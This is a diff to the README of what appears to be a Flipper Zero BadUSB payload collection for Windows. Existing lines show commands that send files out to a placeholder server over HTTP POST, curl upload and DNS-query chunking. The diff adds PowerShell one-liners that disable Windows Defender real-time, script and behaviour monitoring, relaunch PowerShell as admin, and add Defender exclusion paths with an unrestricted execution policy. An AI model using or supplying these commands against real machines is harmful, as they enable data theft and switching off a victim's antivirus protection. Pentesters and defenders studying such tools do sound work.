@@ -72,7 +72,7 @@ A USB Rubber Ducky is a keystroke injection tool that looks like a USB flash dri
 
 <!-- Prerequisites -->
 ### Prerequisites 🚬
-This project (and the Flipper Zero as a whole) uses *Ducky Script version 1*. Additionally, most payloads are tested in a *Windows 10* environment. Further testing will be need on *Windows 11* environment security standards.
+This project (and the Flipper Zero as a whole) uses *Ducky Script version 1*. Additionally, most payloads are tested in a *Windows 10* environment. Further testing will be needed on *Windows 11* environment security standards.
 
 <!-- Getting Started -->
 ## Getting Started 🧰
@@ -257,7 +257,11 @@ curl.exe -F "file1=@filename.txt" <end_point>
 $content = Get-Content %FILE_TO_EXFIL% # output.txt
 Invoke-WebRequest -Uri http://<http_server> -Method POST -Body $content
 ```
-Exfiltrate files and send the contents via a HTTP post request.
+Exfiltrat files and send the contents via a HTTP post request.
+
+  <ul>
+    <li>HTTP POST request:</li>
+  </ul>
 
   <ul>
     <li>FTP File Upload:</li>
@@ -289,6 +293,37 @@ foreach ($chunk in $chunks) {
     Resolve-DnsName -Name $dnsQuery
     Start-Sleep -Seconds 5
 }
+```
+</details>
+
+<details>
+    <summary>ExecutionPolicy/AV</summary>
+    <ul>
+        <li>Disable Real Time Monitoring, Behavior Monitoring etc:</li>
+    </ul>
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
+```
+
+Admin Privileges is Required.
+
+```powershell
+powershell "Start-Process powershell -verb runas"
+```
+
+Can open powershell as admin.
+
+  <ul>
+    <li>Set Exclusive Path:</li>
+  </ul>
+
+```powershell
+Add-MpPreference -ExclusionPath %PATH% ; Set-ExecutionPolicy unrestricted
+```
+To restrict the path back to normal:
+```powershell
+Remove-MpPreference -ExclusionPath %PATH% ; Set-ExecutionPolicy restricted
 ```
 
 </details>
